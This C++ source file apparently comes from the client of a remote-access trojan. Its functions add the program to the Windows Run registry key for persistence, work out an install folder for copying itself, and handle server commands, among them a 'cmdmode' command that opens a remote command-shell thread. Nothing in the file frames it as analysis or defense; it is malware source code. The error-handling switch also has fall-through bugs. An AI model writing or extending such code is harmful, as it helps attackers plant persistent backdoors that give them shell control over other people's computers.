#include "general.h"




bool General::regValueExists(HKEY hKey, LPCSTR keyPath, LPCSTR valueName)
{
	DWORD dwType = 0;
	long lResult = 0;
	HKEY hKeyPlaceholder = NULL;

	lResult = RegOpenKeyEx(hKey, keyPath, NULL, KEY_READ, &hKeyPlaceholder);
	if (lResult == ERROR_SUCCESS)
	{
		lResult = RegQueryValueEx(hKeyPlaceholder, valueName, NULL, &dwType, NULL, NULL);

		if (lResult == ERROR_SUCCESS)
		{
			return true;
		}
		else
			return false;
	}
	else
		return false;
}

bool General::setStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	bool fSuccess;			//TEMP CHANGE, OLD: BOOL fSuccess = TRUE;
	DWORD dwSize;

	const size_t count = MAX_PATH * 2;
	wchar_t szValue[count] = {};


	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");

	if (args != NULL)
	{
		// caller should make sure "args" is quoted if any single argument has a space
		// e.g. (L"-name \"Mark Voidale\"");
		wcscat_s(szValue, count, args);
	}

	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		dwSize = (wcslen(szValue) + 1) * 2;
		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}


bool General::directoryExists(const char* dirName)			//checks if directory exists
{
	DWORD attribs = ::GetFileAttributesA(dirName);
	if (attribs == INVALID_FILE_ATTRIBUTES)
		return false;
	return true;			//original code : return (attribs & FILE_ATTRIBUTE_DIRECTORY); [CHANGED BC WARNING]
}

void General::startProcess(LPCTSTR lpApplicationName, LPTSTR lpArguments)		//starts a process
{
	// additional information
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	// set the size of the structures
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	// start the program up
	CreateProcess(lpApplicationName,   // the path
		lpArguments,        // Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
		0,              // No creation flags
		NULL,           // Use parent's environment block
		NULL,           // Use parent's starting directory 
		&si,            // Pointer to STARTUPINFO structure
		&pi);           // Pointer to PROCESS_INFORMATION structure
						// Close process and thread handles. 
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

std::string General::getInstallFolder()		//gets install folder (example: C:\users\USER\AppData\Roaming\InstallDIR)
{
	std::string rest = "";
	if (!(Settings::folderName == ""))
		rest = "\\" + Settings::folderName;

	std::string concat;
	char* buf = 0;
	size_t sz = 0;
	if (_dupenv_s(&buf, &sz, Settings::installLocation.c_str()) == 0) //gets environment variable
		if (buf != NULL)
		{

			concat = std::string(buf) + rest; //concatenates string
			free(buf);
		}
	return concat;
}

std::string General::getInstallPath(std::string instFolder)		//gets installpath (environment folder + folder name (if supplied) + file name)
{
	std::string concat;
	concat = instFolder + "\\" + Settings::fileName;

	return concat;
}

std::string General::getCurrentPath()		//gets current path of executable
{
	char buf[MAX_PATH];
	GetModuleFileName(0, buf, MAX_PATH);
	return std::string(buf);
}


void General::handleError(int errType, bool errSevere)	//handles errors
{
	if (errSevere)
	{
			//restart client
	}
	else
	{
		switch (errType)
		{
		case 1:		//general error
			sendError("General error");
		case 2:		//cmd error		
			sendError("CMD error");
		case 3:		//networking error
			sendError("Networking error");
		}
	}

}

void General::sendError(std::string errorMessage)	//send error message to server
{
	MessageBox(NULL, errorMessage.c_str(), "sendError replacement", NULL);
}

void General::processCommand(std::string command)
{
	if (command == "kill")
	{

	}
	else if (command == "restart")
	{

	}
	else if (command == "cmdmode")
	{
		if (!CMD::cmdOpen)
		{
			CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)CMD::cmdThread, NULL, NULL, NULL);
			while (!CMD::cmdOpen)
			{
				Sleep(50);
			}
		}
		else
		{
			CMD::cmdptr->writeCMD("exit");
			CMD::cmdOpen = false;
		}
	}
	else
	{
		sendError("Command '" + command + "' was not recognized.");
	}
}